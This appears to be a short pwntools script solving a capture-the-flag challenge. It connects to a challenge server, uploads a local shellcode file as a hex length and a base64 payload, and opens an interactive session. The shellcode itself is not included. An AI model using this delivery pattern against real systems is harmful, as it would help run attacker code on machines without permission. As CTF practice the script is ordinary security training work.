#!/usr/bin/env python3

import os
import sys
from pwn import *
import base64

r = remote("biooosless.challenges.ooo", 6543)

with open("shellcode.bin", "rb") as f:
    file = f.read()

print(hex(len(file))[2:])
r.sendlineafter('> ', hex(len(file))[2:])

print(base64.b64encode(file))
r.sendlineafter('> ', base64.b64encode(file))

r.interactive()

sys.exit(0)

